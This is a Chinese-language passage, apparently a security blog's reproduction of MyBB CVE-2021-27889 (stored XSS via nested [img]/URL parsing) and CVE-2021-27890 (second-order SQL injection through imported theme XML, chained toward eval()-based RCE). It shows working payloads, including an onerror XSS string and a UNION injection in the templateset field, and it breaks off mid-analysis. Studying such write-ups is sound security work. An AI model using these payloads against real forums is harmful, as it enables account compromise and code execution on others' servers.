> 原文链接: https://www.anquanke.com//post/id/235469 


# MyBB XSS 和 SQL注入组合 RCE 复现思路


                                阅读量   
                                **151207**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01fb6fc6f90c7d91de.png)](https://p5.ssl.qhimg.com/t01fb6fc6f90c7d91de.png)



本着学习的心态来看一看这个漏洞利用链。

CVE-2021-27889 是 XSS 漏洞。关键思想：当 mybb 将 markdown 格式的代码转换成 html 的时候，由于 **普通标签解析** 和 **URl 自动解析成a标签** 的功能，当普通标签上**嵌套了URl** 而 URL**自动被解析成 a标签**时，会导致**引号逃逸**，从而导致 XSS。

CVE-2021-27890 是 SQL注入漏洞。关键思想：mybb导入模板时**解析 XML 没做好过滤**，导致 SQL注入。且 mybb 的模板变量赋值是通过 `eval()` 进行赋值，该 SQL注入可**控制部分 `eval()` 的内容**，到达 RCE 的效果。



## CVE-2021-27889初探

在github上下载 1825 源码包，根据官网安装教程来设置权限。

根据描述，猜测应该是发帖的地方存在漏洞:

[https://github.com/mybb/mybb/security/advisories/GHSA-xhj7-3349-mqcm](https://github.com/mybb/mybb/security/advisories/GHSA-xhj7-3349-mqcm)

> The vulnerability can be exploited with minimal user interaction by saving a maliciously crafted MyCode message on the server (e.g. as a post or Private Message) and pointing a victim to a page where the content is parsed.

### <a class="reference-link" name="%E6%9F%A5%E7%9C%8B%20commit"></a>查看 commit

[https://github.com/mybb/mybb/commit/86894e1e6837f7687ecf6d9e572a626fc2d5d4fc](https://github.com/mybb/mybb/commit/86894e1e6837f7687ecf6d9e572a626fc2d5d4fc)

定位到 **inc/class_parser.php** 的 **1591行**，发现整个 commit 就这一处修改

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dc6d798499ddf1ba.png)

### <a class="reference-link" name="%E5%9B%9E%E6%BA%AF%E5%87%BD%E6%95%B0"></a>回溯函数

进入 PHPSTORM 进行回溯查找：ctrl+鼠标点击函数名。<br>
找到一入口点： `newreply.php` 的 `do_newreply` action

回溯的调用函数链：

```
inc/class_parser.php mycode_auto_url()
inc/class_parser.php parse_mycode()
inc/class_parser.php parse_message()
post.php verify_image_count()
post.php validate_post()
newreply.php  if($mybb-&gt;input['action'] == "do_newreply"
```

上面只是列出了一个方便复现的入口点<br>
毕竟`inc/class_parser.php parse_message()` 被很多地方调用了。<br>
而由于描述中说这是一个 XSS。所以不同的入口点说明输出点的位置可能就会不一样。

### <a class="reference-link" name="%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95"></a>简单测试

常规的 XSS payload 一般就是下面两种：
1. 插入 html 标签执行 js
1. 原有的 html 标签引号逃逸，在属性处执行 js
那我们通过黑盒测试进行尝试，对 mybb 简单摸个底。

根据入口点的 `do_newreply` action 以及漏洞通告中可以猜测，论坛回复可能就是入口点。

**意外的坑**<br>
想要回复就得先注册个用户发个帖。在注册用户的时候发现了点小问题：注册时需要校验 **captchaimage** 的值，但注册的时候并没有地方输入这个值。

修复：<br>
关闭 **captchaimage** 。因为这个验证码好像有点问题<br>
修改 `inc/settings.php` 下的

```
$settings['captchaimage'] = "0";
```

接着需要 admin 去激活用户，用户才能发言。后台激活url：<br>**/admin/index.php?module=user-awaiting_activation**

**测试：**<br>
前台回复处尝试发送以下 payload

```
[-- 尝试 html 标签插入，结果被实体编码 --]
&lt;a href="1"&gt;123&lt;/a&gt;
[-- 输出 --]
&amp;lt;a href="1"&amp;gt;123&amp;lt;/a&amp;gt;
```

在回复处发现可以插入链接，那我们就发个链接试试水

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ada530e7e6c00588.png)

尝试发送以下 payload

```
[-- 原包，看起来像是模板标签 --]
[url=http://test.com]value[/url]
[-- 输出 --]
&lt;a href="http://test.com" target="_blank" rel="noopener" class="mycode_url"&gt;value&lt;/a&gt;
=================
[-- 在 [url] 里头添加双引号尝试逃逸，结果不进行模板标签的解析 --]
[url=http://test.com"]value[/url]
[-- 输出 --]
[url=http://test.com"]value[/url]
```

### <a class="reference-link" name="%E8%BF%BD%E8%B8%AA%20patch%20%E7%82%B9%E7%9A%84%E5%89%8D%E5%90%8E%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"></a>追踪 patch 点的前后代码流程

**流程追踪**

**代码审计就是要细心耐心，错过一个调用点可能就没法看到整个利用链。所以尽量每个函数调用都去瞄一瞄，哪怕看不懂，也可以简单记录下操作，哪怕脑中过一遍有这个调用的印象也好。**

观察前文 commit 处的那段代码，发现其正则匹配的似乎像个 a标签 和 url。那我们继续发送 **链接** 吧：

```
[url=http://evil.com/xxx]test[/url]
```

跟到 `class_parser.php:268, postParser-&gt;parse_html()` 时发现对 `&lt;` 和 `&gt;` 进行了实体编码

```
$message = str_replace("&lt;","&amp;lt;",$message);
$message = str_replace("&gt;","&amp;gt;",$message);
```

暂时到目前为止，似乎插入 html 标签进行 xss 的方法行不通了。不过也不能全盘否定，说不定 mybb 后面解析模板标签的时候有什么骚操作呢？可以留个 **尖括号逃逸** 和 **引号逃逸** 的心眼。

接着追踪到 `class_parser.php:456, postParser-&gt;parse_mycode()` 。

首先执行了 `$this-&gt;cache_mycode();`。这个方法用于为 `$this-&gt;mycode_cache` 设置一些正则语句，用于匹配一些模板标签以及对应的替换

贴一部分代码出来：

```
$callback_mycode['url_simple']['regex'] = "#\[url\]((?!javascript)[a-z]+?://)([^\r\n\"&lt;]+?)\[/url\]#si";
$callback_mycode['url_simple']['replacement'] = array($this, 'mycode_parse_url_callback1');
```

之后`postParser-&gt;parse_mycode()` 还对应匹配了 `[img]` 和

走完上面的函数流程后，此时我们原来输入的模板标签就会转换成 html 代码。值得注意的是， `a标签` 自动添加了 **引号** 和 **尖括号**

```
[url=http://evil.com/xxx]test[/url]
&lt;a href="http://evil.com/xxx" target="_blank" rel="noopener" class="mycode_url"&gt;test&lt;/a&gt;

```

接下来就执行到 patch 代码 `mycode_auto_url()` 中了，如下所示：

```
function mycode_auto_url($message)
`{`
    $message = " ".$message;
    //$message value:
    //&lt;a href="http://evil.com/xxx" target="_blank" rel="noopener" class="mycode_url"&gt;test&lt;/a&gt;
    //正则太长了就不写这里了，在下文分析正则
    $message = preg_replace_callback("...REGEX...", array($this, 'mycode_auto_url_callback'), $message);
    .......
    return $message;
`}`
```

分析正则，首先定位 `|` 符。，并根据 `|` 分割 正则表达式 进行分析。这里可以分为两个部分

**第一部分正则**

```
&lt;a\s[^&gt;]*&gt;.*?&lt;/a&gt;
```

不难看出这是在匹配一个 **a标签**

[![](https://p5.ssl.qhimg.com/t0143d3f53cf48af98a.png)](https://p5.ssl.qhimg.com/t0143d3f53cf48af98a.png)

**第二部分正则**<br>
可以再拆分下，这一小部分在匹配 空格 和 一些特殊符号

```
([\s\(\)\[\&gt;])
```

[![](https://p5.ssl.qhimg.com/t014c0cef588841480c.png)](https://p5.ssl.qhimg.com/t014c0cef588841480c.png)

另一小部分：

```
(http|https|ftp|news|irc|ircs|irc6)`{`1`}`(://)([^\/\"\s\&lt;\[\.]+\.([^\/\"\s\&lt;\[\.]+\.)*[\w]+(:[0-9]+)?(/([^\"\s&lt;\[]|\[\])*)?([\w\/\)]))
```

经过测试可以得出，这是在匹配一个 url

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b0a06cc2f14dc055.png)

**组合完整正则**<br>
通过上面测试可知，整一句正则的作用为：**先匹配 a标签，匹配不到就去匹配 url。注意 url 前面需要有一个空格或者特殊符号**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0190224b8afc22fb11.png)

更换 payload为一个链接，重新发送：

```
)http://test.com/abc
```

程序再次走到 `mycode_auto_url()`时，成功匹配到了 URL。`preg_replace_callback` 调用 `mycode_auto_url_callback()`

`mycode_auto_url_callback()` 开头第一行代码 表明我们不能传入 a标签。因为 a标签 在前文的正则中 $matches 只有一个元素。这样将会被直接返回。而传入一个 url 时，由于正则设置了好几个分组，`$matches` 会有多个元素。

这段代码的原注释也说了，不解析 a 标签，只解析 url。

```
//原有的注释
// If we matched a preexisting link (the part of the regexes in mycode_auto_url() before the pipe symbol),
// then simply return it - we don't create links within existing links.

/*
$matches 为 preg_replace_callback  匹配到的所有值。类型为数组。如下：
0 = ")http://test.com/abc"
1 = ")"
2 = "http"
3 = "://"
4 = "test.com/abc"
5 = ""
6 = ""
7 = "/ab"
8 = "b"
9 = "c"
*/
function mycode_auto_url_callback($matches=array())`{`
    if(count($matches) == 1)
    `{`
        return $matches[0];
    `}`
    ......
    $url = "`{`$matches[2]`}``{`$matches[3]`}``{`$matches[4]`}`";
    //调用 mycode_parse_url()。其功能是将 url 塞入到 a标签中并返回
    return $matches[1].$this-&gt;mycode_parse_url($url, $url).$external;
`}`
```

```
function mycode_parse_url($url, $name="")`{`
    .....
    //$templates-&gt;get() 中获取 url 的模板，进行替换
    eval("\$mycode_url = \"".$templates-&gt;get("mycode_url", 1, 0)."\";");  
    return $mycode_url;
`}`
```

所以 `mycode_auto_url` 里的 `preg_replace_callback` 的功能就是将一个url 塞进 a标签中。

最终页面输出

```
&lt;a href="http://test.com/abc" target="_blank" rel="noopener" class="mycode_url"&gt;http://test.com/abc&lt;/a&gt;
```

### <a class="reference-link" name="%E5%89%8D%E5%90%8E%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B%E7%BB%93%E5%90%88%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"></a>前后代码流程结合漏洞原理进行分析

前文说过，一般的 XSS的创建就两种方式：插入html标签 和 原有标签引号逃逸。

然后 mybb 中存在过滤机制，我们无法直接输入 尖括号 以及 在模板标签中输入引号将会不解析模板标签。

**既然我们无法输入尖括号和双引号，那能否让 mybb 为我们输入呢？**

mybb 会为 url 创建一个 a标签，会产生成 尖括号和引号。并且 mybb 还有自带的模板标签，也产生成 尖括号和引号。

如果我们将这两者放在一起，是否会产生尖括号逃逸或引号逃逸呢？

**payload调试**<br>
测试 payload：（不能用 [url]，因为正则匹配那一段如果匹配到 a标签将会直接返回）

```
[img])http://evil.com/xx[/img]
[-- 理想输出 --]
&lt;img src="&lt;a href="http://evil.com/xx" "&gt;http://evil.com/xx&lt;/a&gt;/&gt;
[-- 实际输出 --]
//没将[img]解析成 html
[img])&lt;a href="http://evil.com/xx" target="_blank" rel="noopener" class="mycode_url"&gt;http://evil.com/xx&lt;/a&gt;[/img]
```

跟进函数 `class_parser.php:459, postParser-&gt;parse_mycode()`，发现 `[img]` 需要符合以下 正则 才能被转换成 html

```
#\[img\](\r\n?|\n?)(https?://([^&lt;&gt;\"']+?))\[/img\]#is
.......
```

发现关键正则 `(https?://([^&lt;&gt;\"']+?))`。这意味着 http:// 后面的值除了不能输入 引号 和 尖括号，其他都是可以随便输入的。

**重新构造 payload：**<br>
注意payload 改成了 **.com/xx&lt;span style=”color:red”&gt;(&lt;/span&gt;http://**

```
[img]http://evil.com/xx(http://evil.com/xx[/img]
[-- 输出 --]
&lt;img src="http://evil.com/xx(&lt;a href=" http:="" evil.com="" xx"="" target="_blank" rel="noopener" class="mycode_url"&gt;http://evil.com/xx" loading="lazy"  alt="[Image: xx]" class="mycode_img" /&amp;gt;
```

成功逃逸双引号！仔细观察发现：原 url 中的 `/` 在html中表示为**每个属性的分割**，即上面的 `http:=""` 、 `xx="=""` 等

`xx` 作为了`img` 属性值。我们将之修改为 onerror：

payload：

```
[img]http://evil.com/xx(http://evil.com/onerror=alert(1)[/img]
[-- 输出 --]
&lt;img src="http://evil.com/xx(&lt;a href=" http:="" evil.com="" onerror="alert(1)&amp;quot;" target="_blank" rel="noopener" class="mycode_url"&gt;
```

注意到 alert(1) 后面不正确的语句，console 也给我们报了错

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011b1d19da1203150d.png)

直接使用注释符注释掉即可

payload：

```
[img]http://evil.com/xx(http://evil.com/onerror=alert(1)//[/img]
[-- 输出 --]
&lt;img src="http://evil.com/xx(&lt;a href=" http:="" evil.com="" onerror="alert(1)//&amp;quot;" target="_blank" rel="noopener" class="mycode_url"&gt;
```

成功弹窗！



## CVE-2021-27890初探

参考文章和漏洞通告中都提到了，通过 CVE-2021-27890 的 SQL注入 和 CVE-2021-27889 的 XSS 结合，可以让普通用户执行 RCE。那我们继续分析下 CVE-2021-27890 这个漏洞。

根据描述，是在导入 XML配置的主题 时写入恶意主题，并且在 导出、复制 或 访问主题 时触发漏洞

> Certain theme properties included in theme XML files are not escaped properly when included in SQL queries, leading to an SQL injection vulnerability.
The vulnerability may be exploited when:
<ol>
- a forum administrator with the Can manage themes? permission imports a maliciously crafted theme,
<li>a forum administrator uses the **Export** Theme or **Duplicate** Theme features in the Admin Control Panel, or<br>
a user, for whom the theme has been set, **visits** a forum page.</li>
</ol>

查看 commit，发现修改了3个文件6处代码，都是将 `$properties['templateset']` **强行转为 int类型**。可推测这就是注入点。

****admin/inc/functions_themes.php****<br>**function import_theme_xml($xml, $options=array())**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f9e9d00ac0c06770.png)

****admin/modules/style/themes.php****<br>**function checkAction(id)**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016d5d3af7b4ad5764.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0117892c897288b28f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015bd6895d89422461.png)

****inc/class_templates.php****<br>**function cache($templates)**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0128aa34ab738160be.png)

**function get($title, $eslashes=1, $htmlcomments=1)**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01982f451283842d02.png)

整理获得的信息：后台导入主题时写入恶意主题，是 SQL注入，在导出、复制 或 访问主题 时触发漏洞，可造成 RCE。

综合这些信息可以简单推测漏洞大概成因：既然得是 导出、复制 或 访问主题时 触发，不难想到可能是 SSTI，也有可能是对主题配置进行解析时出现了一些问题；并且还有一个 SQl注入进行配合，则可能是通过 SQL注入篡改主题的某些属性或者标签，写入恶意代码，从而RCE。

### <a class="reference-link" name="%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95"></a>简单测试

进入后台 `/admin/index.php` 找到主操作题的地方

`/admin/index.php?module=style-themes`

根据漏洞通告，优先找导出主题的操作，抓包得到导出主题的接口

```
POST /admin/index.php?module=style-themes&amp;action=export

...... tid=1 &amp; custom_theme=1 &amp; include_templates=1
```

根据前面看 XSS 时发现的命名规则，全局搜索 `['action'] == "export"`。下断点慢慢看流程。

大概流程走完一遍后，结合 patch 定位到 **admin/modules/style/themes.php** 如下代码。发现这是一个可能是一个 **二次注入**

```
//数据库中查找对应 tid 的数据
$query = $db-&gt;simple_select("themes", "*", "tid='".$mybb-&gt;get_input('tid', MyBB::INPUT_INT)."'");
$theme = $db-&gt;fetch_array($query);
//$properties 为数据库中 properties字段的反序列化
$properties = my_unserialize($theme['properties']);
//ps:不清楚 properties字段是如何被赋值的，需要去调试下导入主题的接口来确定如何构造 $properties 的值

......

if($mybb-&gt;input['include_templates'] != 0)
`{`
......
    // ++ !!! ++
    //没对 $properties 进行引号消毒，可产生二次注入
    //注入参数为 $properties['templateset']
    //结合 SQL 语句可知，templateset 为 sid
    $query = $db-&gt;simple_select("templates", "*", "sid='".$properties['templateset']."'");
    // -- !!! --

    while($template = $db-&gt;fetch_array($query))
    `{`
        $template['template'] = str_replace(']]&gt;', ']]]]&gt;&lt;![CDATA[&gt;', $template['template']);

        // ++ !!! ++
        //将 $template 的一些属性值 放入了 $xml 中
        $xml .= "...`{`$template['title']`}`...`{`$template['version']`}`...`{`$template['template']`}`...";
        // -- !!! --
    `}`
......
`}`
```

由于我们不清楚 `properties`字段 是如何被赋值的，需要去调试下**导入主题**的接口来确定如何构造 `$properties` 的值

导入主题前先瞄瞄题配置文件长啥样：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="Default" version="1825"&gt;

    //properties 标签
    &lt;properties&gt;

        //ps：注意这里的 templateset。值为 1。也许上文代码中 
        //$properties['templateset'] 就出自这里
        &lt;templateset&gt;&lt;![CDATA[1]]&gt;&lt;/templateset&gt; 

        &lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
        &lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
        &lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
        &lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
        &lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
......
```

再将这个主题导入，抓包得到接口为 `/admin/index.php?module=style-themes&amp;action=import`。对应去源码中查找 `import` 的 action。搜索 `['action'] == "import"`。下断看看流程。

```
......
//读取上传文件的内容
$contents = @file_get_contents($_FILES['local_file']['tmp_name']);    
......


//[(call) 调用了 import_theme_xml() 方法，以下为import_theme_xml()的代码 ]
function import_theme_xml($xml, $options=array())`{`
    //$xml 就是上面的 $contents
    $parser = new XMLParser($xml);
    $tree = $parser-&gt;get_tree();
    $theme = $tree['theme'];

    ......
    //将 XML中 properties标签 里头的 子标签 抽出来
    //存入 $properties中
    foreach($theme['properties'] as $property =&gt; $value)`{`
        ......
        $properties[$property] = $value['value'];
    `}`
    //往下重点追踪 $properties
`}`


......
//[(call) 调用了 build_new_theme() 方法，以下为build_new_theme()的代码 ]
function build_new_theme($name, $properties=null, $parent=1)`{`
    ......
    //$properties为上面的 $properties
    //序列化 $properties。
    $updated_theme['properties'] = $db-&gt;escape_string(my_serialize($properties));
    //更新数据库
    //数据库为 themes
    $db-&gt;update_query("themes", $updated_theme, "tid='`{`$tid`}`'");
`}`
```

简单走了一遍导入流程可知， `export` action 中的 `$properties['templateset']` 就是 XML 中 `properties` 标签里头的 `templateset` 标签

### <a class="reference-link" name="%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"></a>后台SQL注入

综上所述，SQL注入的触发流程为：
1. 导入一个恶意 XML格式的主题，`properties` 标签中的 `templateset` 为 SQL payload
1. 导出该恶意主题。使 `templateset` payload 注入
下载默认 Theme。修改 `templateset` 值为

ps：由于这个注入查询的是 `mybb_templates` 表，该表数据量贼大，如果直接用 `or sleep(1)#` 会导致卡死

```
&lt;templateset&gt;&lt;![CDATA[0' union select 1,2,3,4,5,6,7#]]&gt;&lt;/templateset&gt;
```

**导入**主题之后，直接去翻数据库可以发现， `templateset` 的值已经成功被修改

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c1d913814b41bd82.png)

再尝试**导出**对应 `tid` 的主题，调试如下：

```
......
//$properties['templateset'] 值为 ' and sleep(5)#   
$query = $db-&gt;simple_select("templates", "*", "sid='".$properties['templateset']."'");

//[(call) 调用了 simple_select() 方法，simple_select()的代码 ]
function simple_select($table, $fields="*", $conditions="", $options=array())`{`

    $query = "SELECT ".$fields." FROM ".$this-&gt;table_prefix.$table;

    if($conditions != "")
    `{`
        $query .= " WHERE ".$conditions;
    `}`
    //此时的 $query值为
    // SELECT * FROM mybb_templates WHERE sid='0' union select 1,2,3,4,5,6,7#'
    .......
    $query = @mysqli_query($this-&gt;read_link, $string);
    ......
    //执行SQL，return $query  
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bddb697ecce51cd8.png)

成功注入！

### <a class="reference-link" name="%E6%B1%A1%E6%9F%93%20eval%20%E5%AF%BC%E8%87%B4%20RCE"></a>污染 eval 导致 RCE

做完这些工作，我们把 ****admin/modules/style/themes.php**** （**Export Theme** 和 **Duplicate Theme**，这两流程差不多） 和 ****admin/inc/functions_themes.php**** （**Import Theme**）patch 的位置都走了遍流程。但并没发现能 RCE 的地方。。

不过 ****inc/class_templates.php**** 这个文件里的 patch 我们还没看，说不定就是这里。

在 **inc/class_templates.php** 中 patch的函数为 `get()` 和 `cache()`。

我们先回溯 `get()`。不搜不知道，一搜吓一跳，`get()` 被调用的地方全是 `eval()`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a0da705ccc4763c1.png)

粗略看了下调用点，就选前文 XSS 中调用过的 `mycode_parse_img()` 来测试吧。毕竟前面走过一遍 XSS 的调用流程，相对熟悉一点。

从入口点 到`mycode_parse_img()` 再到 `get()` 的调用流程是这样的（有一大部分是前面 XSS 时的流程）：

```
newreply.php  newreply action   -- 入口点 
//下面这三个就是 XSS时调用的解析 [img] 的函数
inc/class_parser.php parse_message()
inc/class_parser.php parse_mycode()
inc/class_parser.php mycode_parse_img_callback1()

inc/class_parser.php mycode_parse_img()  -- 执行 eval
inc/class_templates.php get()            -- SQL注入点
```

仔细观察 SQL注入点 `inc/class_templates.php get()`。将这个函数简单整理如下：

```
//inc/class_parser.php mycode_parse_img() 的 eval()
//注意到调用 get() 时，传入的参数都是固定死的
eval("\$mycode_img = \"".$templates-&gt;get("mycode_img", 1, 0)."\";");


//[(call) 调用了 get() 方法，以下为get()的代码 ]
function get($title, $eslashes=1, $htmlcomments=1)`{`
    //全局变量 $theme。为当前管理员设置的主题
    global $db, $theme, $mybb;

    //$title 就是eval() 调用时的 "mycode_img"
    //这里有个前提条件，必须得 $this-&gt;cache[$title] 不存在。可是 $this-&gt;cache 已经预定义了超多 title。
    if(!isset($this-&gt;cache[$title]))
    `{`
        //注入点 $theme['templateset']
        //值得注意的是，$theme['templateset'] 被包裹在小括号中需要逃逸
        $query = $db-&gt;simple_select("templates", "template", "title='".$db-&gt;escape_string($title)."' AND sid IN ('-2','-1','".$theme['templateset']."')", ......);
        $gettemplate = $db-&gt;fetch_array($query);

        $this-&gt;cache[$title] = $gettemplate['template'];
    `}`
    $template = $this-&gt;cache[$title];
    //这里返回了 $template
    //如果我们能通过 SQL注入控制 $gettemplate['template']
    //就能控制返回的 $template
    //从而污染调用者 eval 的内容
    return $template;
`}`
```

发现了一个眼熟的东西 `$theme['templateset']`。这是不是就是前文 SQL注入的那个参数呢？溯源 `$theme`。发现确实如此：

```
//global.php
......
$loadstyle = "tid = '`{`$mybb-&gt;user['style']`}`'";
......
//themes 主题表，前文的SQL注入 payload 就是 写进 了这张表里
$query = $db-&gt;simple_select('themes', 'name, tid, properties, stylesheets, allowedgroups', $loadstyle, array('limit' =&gt; 1));
$theme = $db-&gt;fetch_array($query);
```

在 `get()` 中，只要我们能够执行到 SQL 语句，就可以RCE了。

可是我们得先进入判断 `if(!isset($this-&gt;cache[$title]))` 才行，但 `$this-&gt;cache` 是在数据库中 `mybb_templates` 表中的 `title` 字段，默认多达955行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010e7272ac7dea43b8.png)

这时我们就要去找那些在 `$this-&gt;cache` 中不存在的 `title`，这样才能顺利进入判断；或者去寻找 `eval` 调用时，传入的 `$title` 可控的点。

**编个正则来查找：**

```
\$templates\-\&gt;get\([\"\'](?!error|error_inline|....)[\w0-9_]*

```

搜完一圈，居然没有一处地方是 `title` 不存在的。既然 `title` 都存在，自然无法进入代码中 `if` 判断，也就无法进行 SQL 注入了。

### <a class="reference-link" name="%E9%87%8D%E6%95%B4%E6%80%9D%E8%B7%AF"></a>重整思路

无法进入 `if` 判断，我们找一找 `$this-&gt;cache` 是在哪里初始化的，尝试绕过 `$this-&gt;cache`

发现在 `inc/class_templates.php` 的 `cache()` 中进行了 `$this-&gt;cache` 的初始化

```
//index.php 入口文件
......
require_once './global.php';
......

//global.php 中
......
$templatelist = "headerinclude......";
$templates-&gt;cache($db-&gt;escape_string($templatelist));

//[(call) 调用了 cache() 方法，以下为cache()的代码 ]
function cache($templates)
`{`
    global $db, $theme;
    ......
    //意外发现这里使用了 $theme['templateset']
    //这里也是一个注入点
    //此时我们可以通过SQL注入来篡改 $this-&gt;cache 的值了
    $query = $db-&gt;simple_select("templates", "title,template", "title IN (''$sql) AND sid IN ('-2','-1','".$theme['templateset']."')", array('order_by' =&gt; 'sid', 'order_dir' =&gt; 'asc'));
    //上面这段 SQL 语句为：
    //SELECT title,template FROM mybb_templates WHERE title IN ('...') AND sid IN ('-2','-1','$theme['templateset']')
    //

    //将 $query 查出来的赋值给 cache
      while($template = $db-&gt;fetch_array($query))
     `{`
         $this-&gt;cache[$template['title']] = $template['template'];
     `}`
`}`
```

通过上面的代码我们可以篡改 `$this-&gt;cache` 的值。既然 `$this-&gt;cache` 能够被控制，那自然而然前文中 return 的 `$template` 也能够被控制了。

SQL的触发点有了，接下来寻找 `eval` 的触发点。发现前台的入口文件 `index.php` 首先引入了 `global.php`，并且在 `global.php` 发现一堆的调用点。所以只要我们访问首页就会触发。

**不过这里需要注意个小问题：**

在 `cache()` 中，SQL语句是两个字段

```
SELECT title,template ......
```

而在 `get()` 中，SQL语句是一个字段

```
SELECT template ......
```

而我们注入的 payload 只能输一次。。这就尴尬了。。

**注意：**

